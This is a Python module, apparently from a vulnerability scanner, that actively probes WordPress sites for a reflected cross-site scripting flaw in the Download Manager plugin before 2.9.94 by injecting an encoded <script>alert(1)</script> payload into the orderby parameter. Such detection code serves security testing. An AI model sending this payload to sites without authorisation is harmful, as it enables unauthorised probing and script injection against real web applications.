#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Download Manager plugin before 2."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Download Manager <2.9.94 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'wordpress', 'xss', 'wp-plugin', 'wpdownloadmanager', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/wp-content/plugins/download-manager/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Download Manager', 'License:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Download Manager <2.9.94 - Cross-Site Scripting detected', path=path)
            return True
        return False
